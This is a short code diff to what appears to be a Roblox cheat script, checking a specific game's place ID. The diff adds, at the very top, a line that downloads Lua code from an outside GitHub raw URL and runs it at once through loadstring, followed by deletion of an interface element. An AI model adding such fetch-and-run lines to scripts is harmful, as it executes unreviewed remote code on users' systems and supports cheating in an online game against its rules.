@@ -1,3 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ExZeroz/Roblox/main/Bruh12123.lua"))()
+wait(2)
+
+if game:GetService("CoreGui").StarterDoujin then
+    game:GetService("CoreGui").StarterDoujin:Destroy()
+end
+
 repeat wait(1) until game:IsLoaded()
 if game.PlaceId == 2753915549 then
     W = true
